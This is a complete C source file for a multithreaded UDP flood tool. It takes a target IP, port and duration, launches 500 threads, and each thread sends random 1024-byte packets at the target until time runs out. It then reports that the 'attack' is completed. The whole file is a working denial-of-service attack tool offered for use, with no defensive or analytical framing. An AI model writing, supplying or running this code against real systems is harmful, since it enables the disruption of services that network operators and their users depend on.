
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define PACKET_SIZE 1024  // Adjustable packet size
#define THREAD_COUNT 500  // Adjustable thread count for high concurrency

// Struct to hold attack parameters
typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} attack_params;

// Function to generate random data for packets
void generate_random_data(char *buffer, size_t size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

// Function executed by each thread
void *attack_thread(void *args) {
    attack_params *params = (attack_params *)args;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];
    int sock;

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set up target address
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target_addr.sin_addr);

    // Generate random data for the packet
    generate_random_data(packet, PACKET_SIZE);

    // Send packets in a loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time) {
        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet send failed");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <duration>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Parse command-line arguments
    attack_params params;
    strncpy(params.target_ip, argv[1], sizeof(params.target_ip) - 1);
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    // Initialize threads
    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, &params) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all threads to complete
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack on %s:%d for %d seconds completed.\n", params.target_ip, params.target_port, params.duration);
    return 0;
}
